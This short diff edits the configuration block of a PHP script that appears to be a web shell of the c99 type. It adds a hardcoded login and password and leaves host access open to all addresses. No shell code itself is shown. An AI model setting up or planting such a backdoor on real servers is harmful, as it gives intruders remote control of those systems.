@@ -76,9 +76,9 @@ $surl = htmlspecialchars($surl);
 $timelimit = 0; //time limit of execution this script over server quote (seconds), 0 = unlimited.
 
 //Authentication
-$login = ""; //login
+$login = "default"; //login
 //DON'T FORGOT ABOUT PASSWORD!!!
-$pass = ""; //password
+$pass = "TYGhjfuyg6g3ohlsodii02jkdhsfh"; //password
 $md5_pass = ""; //md5-cryped pass. if null, md5($pass)
 
 $host_allow = array("*"); //array ("{mask}1","{mask}2",...), {mask} = IP or HOST e.g. array("192.168.0.*","127.0.0.1")
